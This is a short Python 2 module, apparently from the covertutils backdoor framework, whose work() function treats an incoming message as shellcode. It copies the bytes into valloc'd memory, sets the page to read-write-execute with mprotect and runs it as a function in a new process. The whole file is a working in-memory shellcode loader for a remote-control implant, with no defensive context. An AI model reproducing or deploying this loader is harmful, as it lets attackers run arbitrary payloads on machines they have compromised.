


def work( storage, message ) :
	from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE, create_string_buffer
	from multiprocessing import Process
	shellcode = message
	size = len(shellcode)
	# print len(shellcode)

	libc = CDLL('libc.so.6')
	sc = c_char_p(shellcode)
	addr = c_void_p(libc.valloc(size))
	print "Memoving"
	memmove(addr, sc, size)
	print "Changing page protection"
	libc.mprotect(addr, size, 0x7)
	print "Making the process code"
	run = cast(addr, CFUNCTYPE(c_void_p))

	# memorywithshell = create_string_buffer(shellcode, len(shellcode))
	# libc.mprotect(memorywithshell, size, 0x7)
	# run = cast(memorywithshell, CFUNCTYPE(c_void_p))

	# run()
	p = Process(target=run)				# run the shellcode as independent process
	p.start()


from covertutils.shells.subshells import ShellcodeSubShell as shell
